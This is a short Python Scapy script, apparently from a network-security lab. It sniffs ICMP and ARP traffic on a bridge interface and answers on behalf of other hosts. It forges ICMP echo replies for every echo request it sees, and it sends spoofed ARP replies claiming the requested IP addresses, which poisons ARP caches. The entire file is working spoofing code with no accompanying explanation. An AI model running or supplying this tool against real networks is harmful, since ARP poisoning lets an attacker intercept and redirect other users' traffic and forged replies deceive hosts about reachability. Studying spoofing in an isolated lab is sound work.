from scapy.all import*

def spoof_pkt(pkt):

	if ICMP in pkt and pkt[ICMP].type==8:
			print("Original packet:")
			print("source IP: ", pkt[IP].src)
			print("Destination IP: ",pkt[IP].dst)
			
			ip = IP(src=pkt[IP].dst, dst=pkt[IP].src, ihl=pkt[IP].ihl)
			icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
			data = pkt[Raw].load
			newpkt = ip/icmp/data
			
			print("Spoofed packet:")
			print("Source IP: ", newpkt[IP].src)
			print("Destination IP : ",newpkt[IP].dst)
			send(newpkt,verbose=0)

	if pkt.haslayer(ARP) and pkt[ARP].op == 1:
	
		newArp = ARP(hwlen=6,plen=4, op = 2, pdst = pkt[ARP].psrc,  
                     hwdst = pkt[ARP].hwsrc,  
                               psrc = pkt[ARP].pdst)
		
		send(newArp,verbose=0)

	
		
pkt = sniff(iface="br-ef6bf2313a33",filter='arp or icmp',prn=spoof_pkt)
